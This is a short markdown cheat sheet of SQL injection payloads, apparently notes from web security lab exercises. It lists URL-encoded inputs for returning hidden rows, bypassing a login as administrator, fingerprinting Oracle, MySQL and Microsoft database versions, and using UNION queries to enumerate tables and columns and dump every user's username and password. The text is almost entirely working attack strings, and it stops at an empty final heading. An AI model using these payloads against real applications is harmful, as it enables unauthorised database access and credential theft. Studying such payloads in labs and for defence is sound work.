# SQL Injection Payloads

**Retreive Hidden Data**
  - Modify the query parameter value
```SQL
'+OR+1=1--
```
---
**Login bypass**
  - Modify the user or username parameter
```SQL
administrator'--
```
---
**Oracle database type and version information**
  - Determine the number of columns being returned by the query and which columns contain text data
```SQL
'+UNION+SELECT+'abc','def'+FROM+dual--
```
  - Display the database version information
```SQL
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
---
**MySQL and Microsoft database type and version information**
- Determine the number of columns being returned by the query and which columns contain text data
```SQL
'+UNION+SELECT+'abc','def'#
```
  - Display the database version information
```SQL
'+UNION+SELECT+@@version,+NULL#
```
---
**Listing database contents from other tables on Oracle databases**
  - Determine the number of columns being returned by the query and which columns contain text data
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
  - Retrieve the list of tables in the database
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
  - Retrive the details of the columns in the table (replace the table name)
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```
  - Retrive the username and passwords of all users (replace the table name and the column name)
```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
---
**Listing database contents from other tables on non-Oracle databases**
